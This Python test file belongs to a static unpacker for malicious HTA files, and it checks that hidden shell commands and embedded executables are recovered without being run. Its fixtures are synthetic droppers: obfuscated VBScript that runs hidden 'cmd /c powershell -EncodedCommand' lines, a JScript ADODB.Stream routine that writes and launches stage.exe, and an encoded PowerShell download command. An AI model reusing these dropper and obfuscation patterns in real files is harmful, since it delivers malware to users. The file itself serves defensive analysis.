from __future__ import annotations

import base64
import struct

import pytest

from unpackers import hta_constant_command as recovery
from unpackers.hta_constant_command import (
    HtaConstantCommandLimits,
    recover_hta_constant_commands,
)


def _fixture(*, payload: str = "PowerShell -NoProfile -EncodedCommand QQ==") -> bytes:
    return f'''<!DOCTYPE html>
<html><body>
<scrIpT tyPE="text/vbscript">
Dim shellObject, commandValue
Set shellObject = CreateObject(ChrW(&H77) & "script.shell")
commandValue = "{payload}"
shellObject.Run Chr(34) & shellObject.ExpandEnvironmentStrings( _
  Chr(&H25) & Chr(&H63) & ChrW(&H4F) & Chr(&H4D) & _
  ChrW(&H73) & ChrW(&H70) & ChrW(&H65) & ChrW(&H63) & ChrW(&H25) _
) & Chr(34) & Chr(34) & ChrW(&H2F) & ChrW(&H63) & ChrW(&H20) & commandValue & Chr(34), 0
Set shellObject = Nothing
Self.Close
</script>
</body></html>'''.replace(" _\n", " ").encode()


def _minimal_pe(size: int = 512) -> bytes:
    payload = bytearray(max(size, 0x400))
    payload[:2] = b"MZ"
    struct.pack_into("<I", payload, 0x3C, 0x80)
    payload[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", payload, 0x84, 0x14C, 1, 0, 0, 0, 0xE0, 0x102)
    optional = 0x98
    struct.pack_into("<H", payload, optional, 0x10B)
    struct.pack_into("<III", payload, optional + 16, 0x1000, 0x1000, 0x1000)
    struct.pack_into("<I", payload, optional + 28, 0x400000)
    struct.pack_into("<II", payload, optional + 32, 0x1000, 0x200)
    struct.pack_into("<II", payload, optional + 56, 0x2000, 0x200)
    struct.pack_into("<H", payload, optional + 68, 3)
    struct.pack_into("<I", payload, optional + 92, 16)
    section = optional + 0xE0
    payload[section : section + 8] = b".text\0\0\0"
    struct.pack_into("<IIII", payload, section + 8, 0x200, 0x1000, 0x200, 0x200)
    struct.pack_into("<I", payload, section + 36, 0x60000020)
    payload[0x200] = 0xC3
    return bytes(payload)


def _jscript_byte_array_fixture(
    payload: bytes,
    *,
    variable: str = "payloadBytes",
    control: str | None = None,
) -> bytes:
    values = ",".join(f"0x{value:02X}" for value in payload)
    if control is None:
        control = f"""
var hexText = "";
for (var index = 0; index < {variable}.length; index++) {{
    var item = {variable}[index].toString(16);
    if (item.length < 2) item = "0" + item;
    hexText += item;
}}
var stream = new ActiveXObject("ADODB.Stream");
var xml = new ActiveXObject("MSXML2.DOMDocument");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");
var binaryPath = "stage.tmp";
var executablePath = "stage.exe";
var node = xml.createElement("bin");
node.dataType = "bin.hex";
node.text = hexText;
stream.Type = 1;
stream.Open();
stream.Write(node.nodeTypedValue);
stream.SaveToFile(binaryPath, 2);
fso.MoveFile(binaryPath, executablePath);
shell.Run(executablePath, 1, false);
"""
    return (
        '<!doctype html><html><script language="JScript">\n'
        f"var {variable}=[{values}];\n"
        f"{control}\n"
        "</script></html>"
    ).encode()


def test_recovers_constant_hta_run_and_powershell_child_without_execution() -> None:
    payload = "PowerShell -NoProfile -EncodedCommand QQ=="
    report, artifacts = recover_hta_constant_commands(_fixture(payload=payload))

    assert report["status"] == "artifacts_recovered"
    assert report["candidate_set_complete"] is True
    assert report["candidate_count"] == 1
    candidate = report["candidates"][0]
    assert candidate["chr_term_count"] == 16
    assert candidate["environment_term_count"] == 1
    assert candidate["window_style"] == 0
    assert candidate["powershell_child_count"] == 1
    assert candidate["shell_released"] is True
    assert candidate["window_closed"] is True
    assert artifacts == [
        (
            "hta-constant-wscript-shell-run-command.cmd",
            f'"%COMSPEC%""/c {payload}"'.encode(),
        ),
        ("hta-constant-powershell-command.cmd", payload.encode()),
    ]
    serialized = repr(report)
    assert payload not in serialized
    assert "QQ==" not in serialized
    assert report["safety"] == {
        "sample_executed": False,
        "network_contacted": False,
        "html_rendered": False,
        "general_vbscript_interpreter_used": False,
        "eval_execute_invoked": False,
        "com_created": False,
        "command_started": False,
        "powershell_started": False,
        "raw_source_included": False,
        "raw_command_included": False,
    }


def test_plus_concatenation_and_wait_argument_are_bounded_constants() -> None:
    data = b"""<html><script language="VBScript">
Dim s, p
Set s = CreateObject("WScript" + ".Shell")
p = "pwsh -NoProfile -c 1"
s.Run "%COMSPEC%" + " /c " + p, 1, False
</script></html>"""
    report, artifacts = recover_hta_constant_commands(data)

    assert report["status"] == "artifacts_recovered"
    assert report["candidates"][0]["wait_argument_present"] is True
    assert report["candidates"][0]["wait"] is False
    assert artifacts[-1] == (
        "hta-constant-powershell-command.cmd",
        b"pwsh -NoProfile -c 1",
    )


def test_powershell_encoded_command_is_decoded_as_utf16le_script() -> None:
    script = (
        "$dst=$env:TEMP; Invoke-WebRequest 'https://example.invalid/a' -OutFile $dst"
    )
    encoded = base64.b64encode(script.encode("utf-16-le")).decode()
    report, artifacts = recover_hta_constant_commands(
        _fixture(payload=f"poWErsHEll -EX ByPass -NoP -w 1 -eC {encoded}")
    )

    candidate = report["candidates"][0]
    assert candidate["powershell_encoded_script_count"] == 1
    assert candidate["powershell_encoded_script_size"] == [len(script.encode())]
    assert artifacts[-1] == (
        "hta-powershell-encoded-command.ps1",
        script.encode(),
    )


def test_encoded_command_wrong_encoding_or_non_script_is_not_emitted() -> None:
    malformed = base64.b64encode(b"Invoke-WebRequest").decode()
    unrelated = base64.b64encode("ordinary sentence".encode("utf-16-le")).decode()
    for encoded in (malformed, unrelated):
        report, artifacts = recover_hta_constant_commands(
            _fixture(payload=f"powershell -ec {encoded}")
        )
        assert report["candidates"][0]["powershell_encoded_script_count"] == 0
        assert all(
            name != "hta-powershell-encoded-command.ps1" for name, _ in artifacts
        )


def test_explicit_javascript_block_is_not_routed_to_vbscript_profile() -> None:
    data = b"""<!doctype html><html><script type="text/javascript">
var command = "powershell -NoProfile";
</script></html>"""
    report, artifacts = recover_hta_constant_commands(data)

    assert report["status"] == "not_applicable"
    assert report["candidate_set_complete"] is True
    assert report["applicability"]["strict_profile_lexical_signal"] is False
    assert artifacts == []


def test_non_vbscript_unquoted_attributes_do_not_create_false_partial() -> None:
    report, artifacts = recover_hta_constant_commands(
        b"<html><script type=text/javascript>var x = 1;</script></html>"
    )

    assert report["status"] == "not_applicable"
    assert report["candidate_set_complete"] is True
    assert report["rejections"] == {}
    assert artifacts == []


def test_dynamic_or_ambiguous_dataflow_fails_closed() -> None:
    variants = (
        _fixture().replace(b"Chr(&H25)", b"Chr(dynamicValue)", 1),
        _fixture().replace(
            b'commandValue = "PowerShell -NoProfile -EncodedCommand QQ=="',
            b'commandValue = "PowerShell -NoProfile"\ncommandValue = "pwsh -c 1"',
        ),
        _fixture().replace(b"Self.Close", b"Execute commandValue"),
        _fixture().replace(b"ChrW(&H25)", b"ChrW(&H10000)", 1),
    )
    for data in variants:
        report, artifacts = recover_hta_constant_commands(data)
        assert report["status"] == "pattern_not_found"
        assert report["candidate_set_complete"] is False
        assert report["rejections"]
        assert artifacts == []


def test_environment_expansion_is_limited_to_comspec_on_same_receiver() -> None:
    unsupported_variable = _fixture().replace(b"Chr(&H63)", b"Chr(&H74)", 1)
    wrong_receiver = _fixture().replace(
        b"shellObject.ExpandEnvironmentStrings",
        b"otherObject.ExpandEnvironmentStrings",
    )
    for data in (unsupported_variable, wrong_receiver):
        report, artifacts = recover_hta_constant_commands(data)
        assert report["candidate_set_complete"] is False
        assert report["candidate_count"] == 0
        assert artifacts == []


def test_input_and_work_limits_fail_closed() -> None:
    input_limited, artifacts = recover_hta_constant_commands(
        _fixture(),
        limits=HtaConstantCommandLimits(max_input_bytes=64),
    )
    assert input_limited["status"] == "input_limit_exceeded"
    assert artifacts == []


def test_large_known_javascript_is_not_reported_as_hta_limit_failure() -> None:
    report, artifacts = recover_hta_constant_commands(
        b"function x(){return 1;}" + b"A" * (2 * 1024 * 1024),
        source_name="delivery.js",
    )

    assert report["status"] == "not_applicable"
    assert report["candidate_set_complete"] is True
    assert report["applicability"]["known_non_hta_suffix"] is True
    assert artifacts == []


def test_large_unknown_utf16_mixed_case_hta_signal_is_not_silently_skipped() -> None:
    source = (
        '<HtMl><ScRiPt type="text/VbScRiPt">Dim x</ScRiPt></HtMl>'.encode("utf-16-le")
        + b"\x20\x00" * 100
    )
    report, artifacts = recover_hta_constant_commands(
        source,
        limits=HtaConstantCommandLimits(max_input_bytes=64),
        source_name="recovered-layer",
    )

    assert report["status"] == "input_limit_exceeded"
    assert report["candidate_set_complete"] is False
    assert report["applicability"]["strict_profile_lexical_encoding"] == "utf-16-le"
    assert artifacts == []

    work_limited, artifacts = recover_hta_constant_commands(
        _fixture(),
        limits=HtaConstantCommandLimits(max_work_units=32),
    )
    assert work_limited["status"] == "limit_exceeded"
    assert work_limited["limit"] == "max_work_units"
    assert artifacts == []


def test_unbalanced_script_tag_and_duplicate_attribute_fail_closed() -> None:
    for data in (
        b'<html><script type="text/vbscript">Dim x</html>',
        _fixture().replace(
            b'tyPE="text/vbscript"',
            b'tyPE="text/vbscript" type="text/vbscript"',
        ),
    ):
        report, artifacts = recover_hta_constant_commands(data)
        assert report["candidate_set_complete"] is False
        assert artifacts == []


def test_multiple_distinct_run_commands_are_not_implicitly_merged() -> None:
    first = _fixture(payload="powershell -c 1").decode()
    second_body = _fixture(payload="powershell -c 2").decode()
    second = second_body[
        second_body.casefold().index("<script") : second_body.casefold().index(
            "</script>"
        )
        + len("</script>")
    ]
    report, artifacts = recover_hta_constant_commands(
        first.replace("</body>", second + "</body>").encode()
    )

    assert report["status"] == "profile_rejected"
    assert report["candidate_count"] == 2
    assert report["candidate_set_complete"] is False
    assert report["rejections"] == {"ambiguous_distinct_run_commands": 1}
    assert artifacts == []


def test_non_bytes_are_rejected() -> None:
    try:
        recover_hta_constant_commands("not bytes")  # type: ignore[arg-type]
    except TypeError as exc:
        assert "bytes" in str(exc)
    else:
        raise AssertionError("bytes以外を受理しました")


def test_private_integer_parser_rejects_unbounded_or_malformed_values() -> None:
    assert recovery._parse_integer("&H63") == 0x63
    assert recovery._parse_integer("-10") == -10
    assert recovery._parse_integer("&H") is None
    assert recovery._parse_integer("1+2") is None


def test_large_jscript_byte_array_is_streamed_to_terminal_pe_without_execution() -> (
    None
):
    payload = _minimal_pe(1_050_000)
    data = _jscript_byte_array_fixture(payload)
    assert len(data) > 5 * 1024 * 1024

    report, artifacts = recover_hta_constant_commands(data, source_name="delivery.hta")

    assert report["status"] == "artifacts_recovered"
    assert report["candidate_set_complete"] is True
    assert report["candidate_count"] == 1
    assert report["input_scan_bytes"] == len(data)
    assert report["profiled_script_body_bytes"] > 5 * 1024 * 1024
    assert report["decoding_scope"] == "script_blocks_and_control_slices_only"
    candidate = report["candidates"][0]
    assert candidate["kind"] == "jscript_binhex_byte_array_dropper"
    assert candidate["byte_array_term_count"] == len(payload)
    assert candidate["payload_size"] == len(payload)
    assert candidate["sink_checks"] == {
        "array_length_loop": True,
        "array_index_hex": True,
        "adodb_stream": True,
        "stream_binary_type": True,
        "stream_open": True,
        "bin_hex": True,
        "node_typed_value": True,
        "stream_write": True,
        "save_to_file": True,
        "move_file": True,
        "run_sink": True,
    }
    assert artifacts[0] == ("hta-jscript-byte-array-payload.exe", payload)
    assert artifacts[1][0] == "hta-jscript-control-slice.js"
    assert b"payloadBytes=[" not in artifacts[1][1]
    assert b"ADODB.Stream" in artifacts[1][1]
    assert report["safety"]["sample_executed"] is False
    assert report["safety"]["network_contacted"] is False


def test_jscript_byte_array_requires_one_pe_and_complete_sink_chain() -> None:
    payload = _minimal_pe()
    ambiguous = _jscript_byte_array_fixture(payload).replace(
        b"var payloadBytes=[",
        b"var decoy=[0x4d,0x5a];\nvar payloadBytes=[",
        1,
    )
    incomplete = _jscript_byte_array_fixture(payload).replace(
        b"stream.SaveToFile(binaryPath, 2);",
        b"// SaveToFile intentionally absent",
    )
    non_pe = _jscript_byte_array_fixture(b"ordinary bytes")

    expected = (
        (ambiguous, "ambiguous_jscript_byte_arrays"),
        (incomplete, "jscript_sink_chain_incomplete"),
        (non_pe, "jscript_byte_array_not_pe"),
    )
    for data, reason in expected:
        report, artifacts = recover_hta_constant_commands(
            data,
            source_name="delivery.hta",
        )
        assert report["status"] == "pattern_not_found"
        assert report["candidate_set_complete"] is False
        assert report["rejections"] == {reason: 1}
        assert artifacts == []


def test_jscript_byte_array_requires_structurally_coherent_pe() -> None:
    malformed = bytearray(_minimal_pe())
    struct.pack_into("<H", malformed, 0x86, 0)

    assert recovery._valid_pe_payload(bytes(malformed)) is False
    report, artifacts = recover_hta_constant_commands(
        _jscript_byte_array_fixture(bytes(malformed)),
        source_name="delivery.hta",
    )
    assert report["status"] == "pattern_not_found"
    assert report["candidate_set_complete"] is False
    assert report["rejections"] == {"jscript_byte_array_not_pe": 1}
    assert artifacts == []


def test_jscript_sink_anchors_in_comments_or_strings_are_not_code() -> None:
    payload = _minimal_pe()
    anchors = (
        "payloadBytes.length; payloadBytes[index].toString(16); "
        'ADODB.Stream; node.dataType="bin.hex"; node.nodeTypedValue; '
        "stream.Write(x); stream.SaveToFile(x); fso.MoveFile(x,y); shell.Run(y);"
    )
    controls = (
        f"/* {anchors} */",
        f'var decoy = "{anchors.replace(chr(34), chr(39))}";',
    )

    for control in controls:
        report, artifacts = recover_hta_constant_commands(
            _jscript_byte_array_fixture(payload, control=control),
            source_name="delivery.hta",
        )
        assert report["status"] == "pattern_not_found"
        assert report["candidate_set_complete"] is False
        assert report["rejections"] == {"jscript_sink_chain_incomplete": 1}
        assert artifacts == []


def test_html_comment_or_js_literal_byte_array_is_not_recovered() -> None:
    payload = _minimal_pe()
    valid = _jscript_byte_array_fixture(payload)
    html_comment = valid.replace(b"<script", b"<!-- <script", 1).replace(
        b"</script>", b"</script> -->", 1
    )
    block_comment = valid.replace(
        b"var payloadBytes=[", b"/* var payloadBytes=[", 1
    ).replace(b"];\n\nvar hexText", b"]; */\n\nvar hexText", 1)
    line_comment = valid.replace(b"var payloadBytes=[", b"// var payloadBytes=[", 1)
    string_literal = valid.replace(
        b"var payloadBytes=[", b'var decoy = "var payloadBytes=[', 1
    ).replace(b"];\n\nvar hexText", b']";\n\nvar hexText', 1)

    for data in (html_comment, block_comment, line_comment, string_literal):
        report, artifacts = recover_hta_constant_commands(
            data,
            source_name="delivery.hta",
        )
        assert report["status"] == "not_applicable"
        assert report["candidate_set_complete"] is True
        assert artifacts == []


def test_html_comment_marker_inside_attribute_does_not_hide_active_script() -> None:
    payload = _minimal_pe()
    valid = _jscript_byte_array_fixture(payload)
    data = valid.replace(
        b"<script",
        b'<div title="<!--">ordinary text</div><script',
        1,
    )

    report, artifacts = recover_hta_constant_commands(
        data,
        source_name="delivery.hta",
    )

    assert report["status"] == "artifacts_recovered"
    assert report["candidate_set_complete"] is True
    assert report["candidate_count"] == 1
    assert artifacts[0] == ("hta-jscript-byte-array-payload.exe", payload)


def test_jscript_sink_chain_correlates_array_receiver_paths_and_order() -> None:
    payload = _minimal_pe()
    valid = _jscript_byte_array_fixture(payload)
    wrong_array = valid.replace(
        b"payloadBytes[index].toString(16)",
        b"decoy[index].toString(16)",
    )
    wrong_receiver = valid.replace(
        b"stream.SaveToFile(binaryPath, 2)",
        b"other.SaveToFile(binaryPath, 2)",
    )
    wrong_order = valid.replace(
        b"fso.MoveFile(binaryPath, executablePath);\nshell.Run(executablePath, 1, false);",
        b"shell.Run(executablePath, 1, false);\nfso.MoveFile(binaryPath, executablePath);",
    )
    write_before_text = valid.replace(b"node.text = hexText;\n", b"").replace(
        b"stream.Write(node.nodeTypedValue);",
        b"stream.Write(node.nodeTypedValue);\nnode.text = hexText;",
    )
    wrong_move_receiver = valid.replace(b"fso.MoveFile(", b"other.MoveFile(")
    wrong_run_receiver = valid.replace(b"shell.Run(", b"other.Run(")
    reassigned_stream = valid.replace(
        b"stream.Type = 1;",
        b"stream = other;\nstream.Type = 1;",
    )
    undefined_path = valid.replace(b'var binaryPath = "stage.tmp";\n', b"")
    missing_type = valid.replace(b"stream.Type = 1;\n", b"")
    missing_open = valid.replace(b"stream.Open();\n", b"")
    reassigned_array = valid.replace(
        b'var hexText = "";',
        b'payloadBytes = decoy;\nvar hexText = "";',
    )
    extended_node_text = valid.replace(
        b"node.text = hexText;",
        b"node.text = hexText + decoy;",
    )
    extended_stream_type = valid.replace(
        b"stream.Type = 1;",
        b"stream.Type = 1 + 1;",
    )
    reassigned_hex_item = valid.replace(
        b'if (item.length < 2) item = "0" + item;',
        b'item = "00";',
    )

    for data in (
        wrong_array,
        wrong_receiver,
        wrong_order,
        write_before_text,
        wrong_move_receiver,
        wrong_run_receiver,
        reassigned_stream,
        undefined_path,
        missing_type,
        missing_open,
        reassigned_array,
        extended_node_text,
        extended_stream_type,
        reassigned_hex_item,
    ):
        report, artifacts = recover_hta_constant_commands(
            data,
            source_name="delivery.hta",
        )
        assert report["status"] == "pattern_not_found"
        assert report["candidate_set_complete"] is False
        assert report["rejections"] == {"jscript_sink_chain_incomplete": 1}
        assert artifacts == []


def test_jscript_symbol_matching_is_precomputed_and_work_bounded() -> None:
    limits = HtaConstantCommandLimits(max_work_units=50_000)
    budget = recovery._Budget(limits)
    source = "root.call(" * 500 + "value" + ")" * 500
    tokens = recovery._tokenize_jscript(source, limits=limits, budget=budget)
    pairs = recovery._symbol_pairs(tokens, budget=budget)

    opening = [index for index, token in enumerate(tokens) if token.value == "("]
    assert len(opening) == 500
    assert all(index in pairs for index in opening)
    assert budget.work_units <= limits.max_work_units

    nested_budget = recovery._Budget(HtaConstantCommandLimits(max_work_units=3_000))
    with pytest.raises(recovery._LimitExceeded, match="max_work_units"):
        recovery._js_calls(tokens, pairs, budget=nested_budget)


def test_invalid_jscript_attributes_and_multiple_candidate_blocks_fail_closed() -> None:
    payload = _minimal_pe()
    valid = _jscript_byte_array_fixture(payload)
    valid_block = valid[valid.index(b"<script") : valid.index(b"</script>") + 9]
    duplicate_attributes = valid.replace(
        b'<script language="JScript">',
        b'<script language="JScript" language="JScript">',
    )
    report, artifacts = recover_hta_constant_commands(
        duplicate_attributes,
        source_name="delivery.hta",
    )
    assert report["status"] == "profile_rejected"
    assert report["candidate_set_complete"] is False
    assert report["rejections"] == {"invalid_script_attributes": 1}
    assert artifacts == []

    two_blocks = valid.replace(b"</script>", b"</script>" + valid_block, 1)
    report, artifacts = recover_hta_constant_commands(
        two_blocks,
        source_name="delivery.hta",
    )
    assert report["status"] == "profile_rejected"
    assert report["candidate_set_complete"] is False
    assert report["candidate_count"] == 2
    assert report["rejections"] == {"ambiguous_distinct_run_commands": 1}
    assert artifacts == []


def test_jscript_byte_array_limits_fail_closed_without_partial_payload() -> None:
    payload = _minimal_pe(1024)
    data = _jscript_byte_array_fixture(payload)

    report, artifacts = recover_hta_constant_commands(
        data,
        source_name="delivery.hta",
        limits=HtaConstantCommandLimits(
            max_input_bytes=len(data),
            max_byte_array_terms=100,
        ),
    )
    assert report["status"] == "limit_exceeded"
    assert report["limit"] == "max_byte_array_terms"
    assert artifacts == []

    report, artifacts = recover_hta_constant_commands(
        data,
        source_name="delivery.hta",
        limits=HtaConstantCommandLimits(
            max_input_bytes=len(data),
            max_control_slice_bytes=32,
        ),
    )
    assert report["status"] == "limit_exceeded"
    assert report["limit"] == "max_control_slice_bytes"
    assert artifacts == []


def test_utf16_vbscript_block_is_decoded_without_whole_document_text_copy() -> None:
    text = _fixture(payload="powershell -c 1").decode()
    data = b"\xff\xfe" + text.encode("utf-16-le")

    report, artifacts = recover_hta_constant_commands(
        data,
        source_name="delivery.hta",
    )

    assert report["status"] == "artifacts_recovered"
    assert report["encoding"] == "utf-16-le"
    assert report["candidate_count"] == 1
    assert artifacts
